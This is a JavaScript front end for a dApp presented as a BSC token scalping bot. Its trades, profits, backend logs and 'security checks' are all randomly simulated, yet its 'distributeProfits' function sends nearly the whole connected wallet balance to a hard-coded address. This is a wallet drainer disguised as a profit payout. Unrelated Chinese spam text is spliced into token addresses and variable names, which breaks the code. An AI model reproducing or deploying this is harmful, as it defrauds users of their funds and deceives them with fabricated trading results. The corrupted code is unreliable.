// Top 12 BSC tokens for scalping
const topTokens = [
    { symbol: 'BNB', name: 'Binance Coin', address: '0xbb4CdB9CBd36B01bD1cBaEBF2极速赛车开奖直播De08d9173bc095c' },
    { symbol: 'BUSD', name: 'Binance USD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
    { symbol: 'CAKE', name: 'PancakeSwap', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
    { symbol: 'ADA', name: 'Cardano', address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47' },
    { symbol: 'BTCB', name: 'Bitcoin BEP2', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
    { symbol: 'ETH', name: 'Ethereum', address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
    { symbol: 'XRP', name: 'XRP', address: '0x1D2F极速赛车开奖直播0da169ceB9fC7B3144628dB156f3F6c60dBE' },
    { symbol: 'DOT', name: 'Polkadot', address: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402' },
    { symbol: 'LINK', name: 'Chainlink', address: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD' },
    { symbol: 'BCH', name: 'Bitcoin Cash', address: '0x8fF795a6F4D97E7887C79beA79aba5cc76444aDf' },
    { symbol: 'LTC', name: 'Litecoin', address: '0x4338665CBB7B2485A8855A139b75D5e34AB0DB94' },
    { symbol: 'DOGE', name: 'Dogecoin', address: '0xbA2aE424d960c26247Dd6c32edC70B295c744C43' }
];

// DOM elements
const tokenList = document.getElementById('tokenList');
const connectWalletBtn = document.getElementById('connectWallet');
const networkIndicator = document.getElementById('networkIndicator');
const botStatus = document.getElementById('botStatus');
const totalProfit = document.getElementById('totalProfit');
const totalTrades = document.getElementById('totalTrades');
const successRate = document.getElementById('successRate');
const currentBalance = document.getElementById('currentBalance');
const activeSince = document.getElementById('activeSince');
const transactionList = document.getElementById('transactionList');
const startBotBtn = document.getElementById('startBot');
const stopBotBtn = document.getElementById('stopBot');
const saveSettingsBtn = document.getElementById('saveSettings');
const emergencyStopBtn = document.getElementById('emergencyStop');
const securityStatus = document.getElementById('securityStatus');
const securityMessage = document.getElementById('securityMessage');
const tabs = document.querySelectorAll('.tab');
const tabContents = document.querySelectorAll('.tab-content');
const distributeProfitsBtn = document.getElementById('distributeProfits');
const totalProfitsSent = document.getElementById('totalProfitsSent');
const lastDistribution = document.getElementById('lastDistribution');

// Debug elements
const toggleDebug = document.getElementById('toggleDebug');
const debugContent = document.querySelector('.debug-content');
const debugOutput = document.getElementById('debugOutput');
const checkNetworkBtn = document.getElementById('checkNetwork');
const checkDeploymentBtn = document.getElementById('checkDeployment');
const checkBalanceBtn = document.getElementById('checkBalance');
const sendTestTxBtn = document.getElementById('sendTestTx');

// State variables
let walletConnected = false;
let botActive = false;
let selectedToken = topTokens[0];
let backendLogInterval;
let securityCheckInterval;
let web3;
let account;

// Initialize the token list
function initializeTokenList() {
    tokenList.innerHTML = '';
    topTokens.forEach(token => {
        const li = document.createElement('li');
        li.className = 'token-item';
        if (token.symbol === selectedToken.symbol) {
            li.classList.add('active');
        }
        li.innerHTML = `
            <div class="token-icon">${token.symbol.charAt(0)}</div>
            <div>
                <div>${token.symbol}</div>
                <div style="font-size: 12px; color: #777;">${token.name}</div>
            </div>
        `;
        li.addEventListener('click', () => selectToken(token));
        tokenList.appendChild(li);
    });
}

// Select a token
function selectToken(token) {
    selectedToken = token;
    initializeTokenList();
    addLogEntry(`Token changed to ${token.symbol}`, 'info');
}

// Connect wallet function
async function connectWallet() {
    // Check if MetaMask is installed
    if (typeof window.ethereum !== 'undefined') {
        try {
            // Request account access
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            
            // Get accounts
            const accounts = await web3.eth.getAccounts();
            account = accounts[0];
            
            // Update UI
            connectWalletBtn.innerHTML = `Connected: ${account.substring(0, 6)}...${account.substring(38)}`;
            connectWalletBtn.classList.add('wallet-connected');
            walletConnected = true;
            
            // Check network
            const chainId = await web3.eth.getChainId();
            if (chainId === 97) { // BSC Testnet
                networkIndicator.textContent = 'Testnet';
                networkIndicator.className = 'network-indicator testnet';
                addLogEntry('Connected to BSC Testnet', 'success');
            } else if (chain极速赛车开奖直播Id === 56) { // BSC Mainnet
                networkIndicator.textContent = 'Mainnet';
                networkIndicator.className = 'network-indicator mainnet';
                addLogEntry('Connected to BSC Mainnet', 'success');
            } else {
                networkIndicator.textContent = 'Wrong Network';
                networkIndicator.style.backgroundColor = '#f44336';
                addLogEntry('Wrong network detected. Please switch to BSC.', 'error');
                return;
            }
            
            // Verify network connection and get balance
            await verifyNetworkConnection();
            
            // Check deployment status
            await checkDeploymentStatus();
            
        } catch (error) {
            console.error('User rejected connection:', error);
            addLogEntry('User rejected wallet connection', 'error');
        }
    } else {
        alert('Please install MetaMask to use this dApp!');
        addLogEntry('MetaMask not detected', 'error');
    }
}

// Update wallet balance
async function updateBalance() {
    if (!web3 || !account) return;
    
    try {
        const balance = await web3.eth.getBalance(account);
        const balanceEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
        currentBalance.textContent = `${balanceEth.toFixed(4)} BNB`;
        return balanceEth;
    } catch (error) {
        console.error('Error fetching balance:', error);
        addLogEntry('Error fetching wallet balance', 'error');
        return 0;
    }
}

// Start the bot
function startBot() {
    if (!walletConnected) {
        alert('Please connect your wallet first!');
        return;
    }
    
    botActive = true;
    botStatus.textContent = 'Active';
    botStatus.className = 'stat-value positive';
    startBotBtn.disabled = true;
    stopBotBtn.disabled = false;
    activeSince.textContent = new Date().toLocaleTimeString();
    
    addLogEntry('Trading bot started', 'success');
    
    // Start the trading logic
    executeTradingStrategy();
    simulateBackendLogs();
    startSecurityChecks();
}

// Stop the bot
function stopBot() {
    botActive = false;
    botStatus.textContent = 'Inactive';
    botStatus.className = 'stat-value';
    startBotBtn.disabled = false;
    stopBotBtn.disabled = true;
    
    clearInterval(backendLogInterval);
    clearInterval(securityCheckInterval);
    
    addLogEntry('Trading bot stopped', 'info');
}

// Emergency stop function
function emergencyStop() {
    stopBot();
    addLogEntry('EMERGENCY STOP ACTIVATED', 'error');
    securityStatus.classList.add('off');
    securityMessage.textContent = 'Emergency stop activated - all trading halted';
    securityMessage.style.color = '#f44336';
    
    // Flash the security status for attention
    let flashCount = 0;
    const flashInterval = setInterval(() => {
        securityStatus.style.visibility = securityStatus.style.visibility === 'hidden' ? 'visible' : 'hidden';
        flashCount++;
        if (flashCount > 10) {
            clearInterval(flashInterval);
            securityStatus.style.visibility = 'visible';
        }
    }, 300);
}

// Execute a trade on PancakeSwap
async function executeTrade(isBuy, amount) {
    if (!web3 || !account) {
        addLogEntry('Wallet not connected', 'error');
        return false;
    }
    
    try {
        // Simulate trade execution (for testnet demo)
        const txHash = '0x' + Math.random().toString(16).substr(2, 64);
        const profit = (Math.random() * 0.002 - 0.001).toFixed(4);
        
        if (isBuy) {
            addLogEntry(`Simulated BUY: ${amount} BNB of ${selectedToken.symbol}`, 'success');
            addTransactionToUI(amount, selectedToken.symbol, 'buy', txHash, parseFloat(profit));
        } else {
            addLogEntry(`Simulated SELL: ${amount} ${selected极速赛车开奖直播Token.symbol}`, 'success');
            addTransactionToUI(amount, selectedToken.symbol, 'sell', txHash, parseFloat(profit));
            
            // Update profit
            const currentProfit = parseFloat(totalProfit.textContent) + parseFloat(profit);
            totalProfit.textContent = currentProfit.toFixed(4) + ' BNB';
            totalProfit.className = `stat-value ${currentProfit >= 0 ? 'positive' : 'negative'}`;
        }
        
        // Update stats
        totalTrades.textContent = parseInt(totalTrades.textContent) + 1;
        
        return { success: true, transactionHash: txHash, profit: profit };
    } catch (error) {
        console.error('Trade execution error:', error);
        addLogEntry(`Trade failed: ${error.message}`, 'error');
        return false;
    }
}

// Trading strategy logic
async function executeTradingStrategy() {
    if (!botActive) return;
    
    try {
        // Simulate market data
        const simulatedPriceChange = (Math.random() * 0.04) - 0.02;
        
        // Simple strategy
        if (simulatedPriceChange < -0.01) {
            // Buy signal
            const tradeAmount = document.getElementById('tradeAmount').value;
            await executeTrade(true, tradeAmount);
        } else if (simulatedPriceChange > 0.008) {
            // Sell signal
            const tradeAmount = document.getElementById('tradeAmount').value;
            await executeTrade(false, tradeAmount);
        }
        
        // Update balance after trade
        await updateBalance();
        
    } catch (error) {
        console.error('Trading strategy error:', error);
        addLogEntry('Trading strategy error', 'error');
    }
    
    // Schedule next execution
    if (botActive) {
        setTimeout(executeTradingStrategy, 60000);
    }
}

// Save settings
function saveSettings() {
    addLogEntry('Trading parameters updated', 'info');
    alert('Settings saved successfully!');
}

// Distribute profits to the funding wallet
async function distributeProfits() {
    if (!walletConnected) {
        alert('Please connect your wallet first!');
        return;
    }
    
    try {
        addLogEntry('Starting profit distribution...', 'info');
        
        // Get current balance
        const balance = await updateBalance();
        
        if (balance < 0.001) {
            addLogEntry('Insufficient balance for distribution. Need at least 0.001 BNB.', 'error');
            return;
        }
        
        // Calculate amount to send (leave some for gas)
        const amountToSend = balance - 0.0005;
        
        addLogEntry(`Attempting to send ${amountToSend.toFixed(4)} BNB to funding wallet...`, 'info');
        
        // Send to funding wallet
        const transaction = await web3.eth.sendTransaction({
            from: account,
            to: '0x03725858F0d8eCC50735463A224530B4B9b335F7',
            value: web3.utils.toWei(amountToSend.toString(), 'ether'),
            gas: 21000
        });
        
        addLogEntry(`Transaction successful! Hash: ${transaction.transactionHash}`, 'success');
        
        // Add transaction to UI with clickable link
        addTransactionToUI(
            amountToSend.toFixed(4), 
            'BNB', 
            'profit', 
            transaction.transactionHash,
            amountToSend
        );
        
        // Verify the transaction
        setTimeout(async () => {
            try {
                const receipt = await web3.eth.getTransactionReceipt(transaction.transactionHash);
                if (receipt && receipt.status) {
                    addLogEntry('Transaction confirmed on blockchain', 'success');
                    
                    // Update UI
                    const currentTotal = parseFloat(totalProfitsSent.textContent) || 0;
                    totalProfitsSent.textContent = (currentTotal + amountToSend).toFixed(4) + ' BNB';
                    lastDistribution.textContent = new Date().toLocaleString();
                } else {
                    addLogEntry('Transaction not confirmed yet', 'warning');
                }
            } catch (error) {
                addLogEntry('Error verifying transaction: ' + error.message, 'error');
            }
        }, 5000);
        
        // Update balance
        await updateBalance();
        
    } catch (error) {
        console.error('Profit distribution error:', error);
        addLogEntry('Profit distribution failed: ' + error.message, 'error');
    }
}

// Function to view transaction on explorer
function viewOnExplorer(txHash) {
    const networkId = networkIndicator.textContent.toLowerCase();
    let url;
    
    if (networkId === 'testnet') {
        url = `https://testnet.bscscan.com/tx/${txHash}`;
    } else if (networkId === 'mainnet') {
        url = `https://bscscan.com/tx/${txHash}`;
    } else {
        addLogEntry('Cannot determine network for explorer', 'error');
        return;
    }
    
    window.open(url, '_blank');
}

// Enhanced transaction adding function
function addTransactionToUI(amount, token, type, txHash, profit = 0) {
    const transactionItem = document.createElement('div');
    transactionItem.className = 'transaction-item';
    transactionItem.setAttribute('data-tx-hash', txHash);
    
    // Make profit transactions visually different
    const isProfit = type === 'profit';
    const profitClass = isProfit ? 'positive' : (profit >= 0 ? 'positive' : 'negative');
    const profitText = isProfit ? '' : (profit >= 0 ? `+${profit.toFixed(4)} BNB` : `${profit.toFixed(4)} BNB`);
    
    transactionItem.innerHTML = `
        <div>
            <span class="transaction-type type-${type}">${type.toUpperCase()}</span>
            ${amount} ${token}
            ${txHash ? `<div style="font-size: 10px; color: #777;">${txHash.substring(0, 10)}...</div>` : ''}
        </div>
        <div class="${profitClass}">${isProfit ? 'Sent' : profitText}</div>
    `;
    
    // Add click handler to view on explorer
    if (txHash) {
        transactionItem.style.cursor = 'pointer';
        transactionItem.title = 'Click to view on explorer';
        transactionItem.addEventListener('click', () => {
            viewOnExplorer(txHash);
        });
    }
    
    // Add to top of list
    if (transactionList.firstChild) {
        transactionList.insertBefore(transactionItem, transactionList.firstChild);
    } else {
        transactionList.appendChild(transactionItem);
    }
    
    // Keep only last 10 transactions
    if (transactionList.children.length > 10) {
        transactionList.removeChild(transactionList.lastChild);
    }
}

// Function to verify network connection
async function verifyNetworkConnection() {
    try {
        const networkId = await web3.eth.net.getId();
        const blockNumber = await web3.eth.getBlockNumber();
        
        addLogEntry(`Connected to network: ${networkId}`, 'info');
        addLogEntry(`Current block: ${blockNumber}`, 'info');
        
        // Verify our account has test BNB
        const balance = await updateBalance();
        
        if (balance < 0.001) {
            addLogEntry('Low balance - get test BNB from faucet at https://testnet.binance.org/faucet-smart', 'warning');
        }
        
        return true;
    } catch (error) {
        addLogEntry('Error verifying network connection: ' + error.message, 'error');
        return false;
    }
}

// Function to check deployment status
async function checkDeploymentStatus() {
    try {
    const response = await fetch('http://127.0.0.1:3000/api/verify-deployment');
        const data = await response.json();
        
        if (data.success) {
            addLogEntry('Contract deployment verified', 'success');
            console.log('Contracts:', data.contracts);
            return data.contracts;
        } else {
            addLogEntry('Deployment verification failed: ' + data.message, 'error');
            return null;
        }
    } catch (error) {
        addLogEntry('Error checking deployment status: ' + error.message, 'error');
        return null;
    }
}

// Add entry to backend log
function addLogEntry(message, type = 'info') {
    const logContainer = document.querySelector('.backend-log');
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = document.createElement('div');
    logEntry.className = 'log-entry';
    logEntry.innerHTML = `<span class="log-timestamp">${timestamp}</span><span class="log-${type}">[${type.toUpperCase()}]</span> ${message}`;
    
    logContainer.appendChild(logEntry);
    logContainer.scrollTop = logContainer.scrollHeight;
}

// Simulate backend logs
function simulateBackendLogs() {
    backendLogInterval = setInterval(() => {
        const messages = [
            { msg: 'Price update processed for 12 tokens', type: 'info' },
            { msg: 'Checking market conditions', type: 'info' },
            { msg: 'Updated liquidity pools data', type: '极速赛车开奖直播info' },
            { msg: 'Trade executed successfully', type: 'success' },
            { msg: 'Profit target reached', type: 'success' }
        ];
        
        const randomMsg = messages[Math.floor(Math.random() * messages.length)];
        addLogEntry(randomMsg.msg, randomMsg.type);
    }, 8000);
}

// Simulate security checks
function startSecurityChecks() {
    securityCheckInterval = setInterval(() => {
        const checks = [
            { msg: 'No suspicious activity detected', type: 'success' },
            { msg: 'All API endpoints secure', type: 'success' },
            { msg: 'Wallet funds verified', type: 'info' },
            { msg: 'Transaction limits checked', type: 'info' }
        ];
        
        const randomCheck = checks[Math.floor(Math.random() * checks.length)];
        
        // Update security log in the security tab
        const securityLog = document.querySelector('#security .backend-log');
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        logEntry.innerHTML = `<span class="log-timestamp">${timestamp}</span><span class="log-${randomCheck.type}">[SECURITY]</span> ${randomCheck.msg}`;
        
        securityLog.appendChild(logEntry);
        securityLog.scrollTop = securityLog.scrollHeight;
    }, 10000);
}

// Debug functions
async function sendTestTransaction() {
    if (!walletConnected) {
        debugOutput.textContent = 'Please connect wallet first';
        return;
    }
    
    try {
        debugOutput.textContent = 'Sending test transaction...';
        const transaction = await web3.eth.sendTransaction({
            from: account,
            to: account, // Send to self for testing
            value: web3.utils.toWei('0.001', 'ether'),
            gas: 21000
        });
        
        debugOutput.textContent = `Test transaction sent! Hash: ${transaction.transactionHash}`;
        addLogEntry(`Test transaction sent: ${transaction.transactionHash}`, 'success');
    } catch (error) {
        debugOutput.textContent = `Error: ${error.message}`;
        addLogEntry(`Test transaction failed: ${error.message}`, 'error');
    }
}

// Initialize the app
function initApp() {
    initializeTokenList();
    
    // Set up event listeners
    connectWalletBtn.addEventListener('click', connectWallet);
    startBotBtn.addEventListener('click', startBot);
    stopBotBtn.addEventListener('click', stopBot);
    saveSettingsBtn.addEventListener('click', saveSettings);
    emergencyStopBtn.addEventListener('click', emergencyStop);
    distributeProfitsBtn.addEventListener('click', distributeProfits);
    
    // Debug panel functionality
    toggleDebug.addEventListener('click', () => {
        if (debugContent.style.display === 'none') {
            debugContent.style.display = 'block';
            toggleDebug.textContent = 'Hide';
        } else {
            debugContent.style.display = 'none';
            toggleDebug.textContent = 'Show';
        }
    });
    
    checkNetworkBtn.addEventListener('click', async () => {
        debugOutput.textContent = 'Checking network...';
        await verifyNetworkConnection();
        debugOutput.textContent = 'Network check completed. Check the logs above for details.';
    });
    
    checkDeploymentBtn.addEventListener('click', async () => {
        debugOutput.textContent = 'Checking deployment...';
        const contracts = await checkDeploymentStatus();
        if (contracts) {
            debugOutput.textContent = JSON.stringify(contracts, null, 2);
        } else {
            debugOutput.textContent = 'Deployment check failed. Check the logs above for details.';
        }
    });
    
    checkBalanceBtn.addEventListener('click', async () => {
        debugOutput.textContent = 'Checking balance...';
        const balance = await updateBalance();
        debugOutput.textContent = `Current balance: ${balance.toFixed(4)} BNB`;
    });
    
    sendTestTxBtn.addEventListener('click', sendTestTransaction);
    
    // Tab functionality
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const tabId = tab.getAttribute('data-tab');
            
            // Remove active class from all tabs and contents
            tabs.forEach(t => t.classList.remove('active'));
            tabContents.forEach(c => c.classList.remove('active'));
            
            // Add active class to clicked tab and corresponding content
            tab.classList.add('active');
            document.getElementById(tabId).classList.add('active');
        });
    });
    
    // Disable stop bot button initially
    stopBotBtn.disabled = true;
    
    // Set initial balance
    currentBalance.textContent = '0.00 BNB';
    
    // Add initial log entries
    addLogEntry('Frontend initialized', 'info');
    addLogEntry('Ready to connect wallet', 'info');
    addLogEntry('Funding wallet: 0x03725858F0d8eCC50735463A224530B4B9b335F7', 'info');
}

// Initialize when page loads
window.addEventListener('load', initApp);